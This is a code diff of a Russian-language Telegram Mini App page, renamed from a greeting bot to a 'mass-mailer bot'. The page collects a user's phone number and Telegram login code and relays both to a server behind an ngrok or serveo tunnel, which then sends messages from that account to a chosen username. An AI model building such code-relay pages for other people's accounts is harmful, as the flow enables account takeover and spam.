@@ -13,112 +13,122 @@
             color: var(--tg-theme-text-color, #000); 
             display: flex; flex-direction: column; align-items: center;
         }
+        .container { width: 100%; max-width: 350px; }
         input { 
-            width: 100%; padding: 12px; margin-bottom: 10px; 
-            border-radius: 8px; border: 1px solid #ccc; 
-            box-sizing: border-box; 
+            width: 100%; padding: 12px; margin-bottom: 15px; 
+            border-radius: 10px; border: 1px solid #ccc; 
+            box-sizing: border-box; font-size: 16px;
         }
         button { 
-            width: 100%; padding: 14px; 
+            width: 100%; padding: 15px; 
             background-color: var(--tg-theme-button-color, #3390ec); 
-            color: #fff; border: none; border-radius: 8px; 
-            font-weight: bold; cursor: pointer; 
+            color: #fff; border: none; border-radius: 10px; 
+            font-size: 16px; font-weight: bold; cursor: pointer; 
         }
+        button:active { opacity: 0.8; }
         .hidden { display: none; }
-        #status { margin-top: 15px; color: green; font-size: 14px; text-align: center; }
-        .error { color: red !important; }
+        #status { margin-top: 15px; text-align: center; font-size: 14px; }
+        .success { color: green; }
+        .error { color: red; }
     </style>
 </head>
 <body>
-    <h2 style="margin-bottom: 20px;">🤖 Привет-бот</h2>
+    <h2>🚀 Бот-Рассыльщик</h2>
     
-    <div id="step1" style="width: 100%;">
-        <input type="tel" id="phone" placeholder="+7999...">
-        <button onclick="login()">Получить код</button>
-    </div>
+    <div class="container">
+        <div id="step1">
+            <input type="tel" id="phone" placeholder="+79991234567">
+            <button onclick="login()">Получить код</button>
+        </div>
 
-    <div id="step2" class="hidden" style="width: 100%;">
-        <input type="number" id="code" placeholder="Код из Telegram">
-        <button onclick="sendCode()">Войти</button>
-    </div>
+        <div id="step2" class="hidden">
+            <input type="number" id="code" placeholder="Код подтверждения">
+            <button onclick="sendCode()">Войти</button>
+        </div>
 
-    <div id="step3" class="hidden" style="width: 100%;">
-        <input type="text" id="target" placeholder="Юзернейм друга (без @)">
-        <input type="text" id="btnName" placeholder="Имя кнопки" oninput="updBtn()">
-        <button id="mainBtn" onclick="fire()">Поприветствовать</button>
+        <div id="step3" class="hidden">
+            <input type="text" id="target" placeholder="Ник друга (без @)">
+            <input type="text" id="btnName" placeholder="Текст кнопки" oninput="updBtn()">
+            <button id="mainBtn" onclick="fire()">Поприветствовать</button>
+        </div>
+        
+        <div id="status"></div>
     </div>
-    
-    <div id="status"></div>
 
     <script>
-        // ============================================
-        // ТВОЯ ССЫЛКА SERVEO (ИЗ ПОСЛЕДНЕГО СООБЩЕНИЯ)
-        const SERVER_URL = "https://8b5f48c39c2b280f-91-239-23-66.serveousercontent.com"; 
-        // ============================================
+        // =================================================================
+        // ВАЖНО: Вставь сюда ссылку из окна Ngrok (Forwarding)
+        // Она начинается на https:// и заканчивается на .ngrok-free.app
+        // БЕЗ слэша "/" в конце!
+        
+        const SERVER_URL = "https://stiffish-queenie-un-xxxx-xxxx.ngrok-free.app";
+        
+        // =================================================================
 
         const tg = window.Telegram.WebApp;
         tg.expand();
+
         let myPhone = localStorage.getItem("ph") || "";
         if(myPhone) document.getElementById('phone').value = myPhone;
 
         function showStatus(text, isErr = false) {
             const el = document.getElementById('status');
             el.innerText = text;
-            el.className = isErr ? 'error' : '';
+            el.className = isErr ? 'error' : 'success';
         }
 
         async function req(path, body) {
             try {
-                const r = await fetch(SERVER_URL + path, {
+                const response = await fetch(SERVER_URL + path, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true'},
                     body: JSON.stringify(body)
                 });
-                return await r.json();
+                return await response.json();
             } catch (e) {
-                return {status: 'error', message: 'Ошибка сети. Проверь туннель на ПК!'};
+                return {status: 'error', message: 'Ошибка связи! Проверь, запущен ли Python и Ngrok.'};
             }
         }
 
         async function login() {
             myPhone = document.getElementById('phone').value.replace(/\s/g, '');
             localStorage.setItem("ph", myPhone);
-            showStatus("Отправка запроса...");
+            showStatus("Подключение...");
             
             let res = await req('/login/start', {phone: myPhone});
-            if(res.status == 'ok') {
+            if(res.status === 'ok') {
                 document.getElementById('step1').classList.add('hidden');
-                if(res.step == 'authorized') {
+                if(res.step === 'authorized') {
                     document.getElementById('step3').classList.remove('hidden');
                     showStatus("Вы уже вошли!");
                 } else {
                     document.getElementById('step2').classList.remove('hidden');
-                    showStatus("Введите код из Telegram");
+                    showStatus("Код отправлен в Telegram!");
                 }
             } else showStatus(res.message, true);
         }
 
         async function sendCode() {
             let code = document.getElementById('code').value.trim();
-            showStatus("Проверяем...");
+            showStatus("Проверка кода...");
             let res = await req('/login/complete', {phone: myPhone, code: code});
-            if(res.status == 'ok') {
+            if(res.status === 'ok') {
                 document.getElementById('step2').classList.add('hidden');
                 document.getElementById('step3').classList.remove('hidden');
-                showStatus("Успешно!");
+                showStatus("Успешный вход!");
             } else showStatus(res.message, true);
         }
 
         function updBtn() {
-            let t = document.getElementById('btnName').value;
-            document.getElementById('mainBtn').innerText = t ? "Поприветствовать " + t : "Поприветствовать";
+            let txt = document.getElementById('btnName').value;
+            document.getElementById('mainBtn').innerText = txt ? "Поприветствовать " + txt : "Поприветствовать";
         }
 
         async function fire() {
             let target = document.getElementById('target').value.trim();
-            showStatus("Отправка...");
+            showStatus("Отправляем...");
             let res = await req('/greet', {phone: myPhone, target: target});
-            if(res.status == 'ok') showStatus("Отправлено: " + res.sent);
+            if(res.status === 'ok') showStatus("Отправлено: " + res.sent);
             else showStatus(res.message, true);
         }
     </script>
